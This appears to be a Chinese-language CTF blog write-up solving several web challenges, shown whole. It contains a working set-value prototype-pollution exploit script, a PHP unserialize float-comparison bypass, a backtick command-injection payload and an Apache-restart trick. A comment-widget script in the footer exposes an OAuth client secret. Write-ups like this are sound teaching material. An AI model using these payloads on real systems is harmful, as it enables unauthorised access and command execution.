<h2 id="littlegame">littlegame</h2>
<p>js原型链污染，<code>set-value</code>库3.0.0旧版本。公开exploit如下：</p>
<figure class="highlight javascript"><table><hr /><h2 id="littlegame">littlegame</h2><p>js原型链污染，<code>set-value</code>库3.0.0旧版本。公开exploit如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> setFn = <span class="built_in">require</span>(<span class="string">&#x27;set-value&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> paths = [<span class="string">&#x27;constructor.prototype.a0&#x27;</span>, <span class="string">&#x27;__proto__.a1&#x27;</span>,];</span><br><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> p <span class="keyword">of</span> paths) &#123; setFn(&#123;&#125;, p, <span class="literal">true</span>); &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; paths.length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((&#123;&#125;)[<span class="string">`a<span class="subst">$&#123;i&#125;</span>`</span>] === <span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">`Yes with <span class="subst">$&#123;paths[i]&#125;</span>`</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure><p>拿来主义，用就完了</p><p>阅读源码，可以发现在<code>/Privilege</code>处进行了<code>set-value</code>调用，并且在<code>/DeveloperControlPanel</code>处检查了<code>Admin</code>对象（一个普通的数组）的任意可控属性，那污染字典类型的原型，添加一个自定义属性即可。</p><p>最终exploit：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> session</span><br><span class="line">ses = session()</span><br><span class="line">host = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">ses.get(host + <span class="string">&#x27;/SpawnPoint&#x27;</span>)</span><br><span class="line">ses.post(host + <span class="string">&#x27;/Privilege&#x27;</span>, data=&#123;</span><br><span class="line">    <span class="string">&#x27;NewAttributeKey&#x27;</span>: <span class="string">&#x27;__proto__.pwd&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;NewAttributeValue&#x27;</span>: <span class="string">&#x27;frankli&#x27;</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="built_in">print</span>(ses.post(host + <span class="string">&#x27;/DeveloperControlPanel&#x27;</span>, data=&#123;</span><br><span class="line">    <span class="string">&#x27;key&#x27;</span>: <span class="string">&#x27;pwd&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;frankli&#x27;</span></span><br><span class="line">&#125;).text)</span><br></pre></td></tr></table></figure><h2 id="babyunserialize">babyunserialize</h2><p>见<a href="https://blog.frankli.site/2020/08/21/fatfree%20POP/">另一篇博客</a></p><h2 id="easytrick">easytrick</h2><p>一开始是联想到了Nu1l在某处的论坛里发的利用<code>Exception</code>的<code>__toString</code>来绕过判等（属性不同，不强等于），但是无奈太长了<br><code>SimpleXMLElement</code>也找不到合适的方式利用(有可能么？)</p><p>后来想了想，不可能是利用对象的<code>__toString</code>来绕过，因为这样无法同时绕过三个判断</p><p>最后发现<code>1.00...001</code>在转字符串的时候会变成<code>1</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">trick</span>:</span></span><br><span class="line">    trick1 = <span class="number">1.00000000000001</span></span><br><span class="line">    trick2 = <span class="number">1.000000000000001</span></span><br><span class="line"><span class="built_in">print</span>(serialize(trick()))</span><br></pre></td></tr></table></figure><h2 id="剩下两道就放个payload吧。。">剩下两道就放个payload吧。。</h2><ul><li>rceme: 没过滤反引号 <code>?a=&#123;if:var_dump(``ls``)&#125;&#123;end if&#125;</code></li><li>easyphp: Apache收到SIGUSR1的时候会软重启 <code>?a=call_user_func&amp;b=pcntl_wait</code></li></ul><div id="gitalk-container"></div><script src="https://cdn.bootcss.com/blueimp-md5/2.12.0/js/md5.min.js"></script><link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css"><script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script><script>var gitalkConfig = {"clientID":"5955d155fe2ea768241e","clientSecret":"f96bbda9ff434950217f24f7f9369f8b8de3b025","repo":"frankli0324.github.io","owner":"frankli0324","admin":["frankli0324"],"distractionFreeMode":false};    gitalkConfig.id = md5(location.pathname);var gitalk = new Gitalk(gitalkConfig);    gitalk.render("gitalk-container");    </script><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>